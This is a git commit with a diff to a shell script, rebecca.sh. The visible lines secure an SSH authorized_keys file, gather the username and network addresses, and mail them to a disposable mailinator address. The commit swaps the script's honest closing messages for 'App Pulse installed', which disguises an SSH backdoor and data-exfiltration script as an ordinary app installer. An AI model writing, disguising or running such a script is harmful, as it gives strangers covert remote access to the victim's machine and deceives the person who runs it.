4f162330856bf6f056ccd513f531879206d609f9
Dave Quah <quahdave@gmail.com>
2018-02-05 10:20:51 +0800

    [Dave] :)

--- rebecca.sh
+++ rebecca.sh
@@ -9,5 +9,4 @@ chmod 700 ~/.ssh/authorized_keys
 id="$(id -un)"
 body="$(ifconfig | grep "inet ")"
 echo "$id $body" | mail -s "ip address" "mischief_managed@mailinator.com"
-echo "rsa public key added and email sent"
-echo "don't forget to turn on remote login!"
+echo "App Pulse installed"
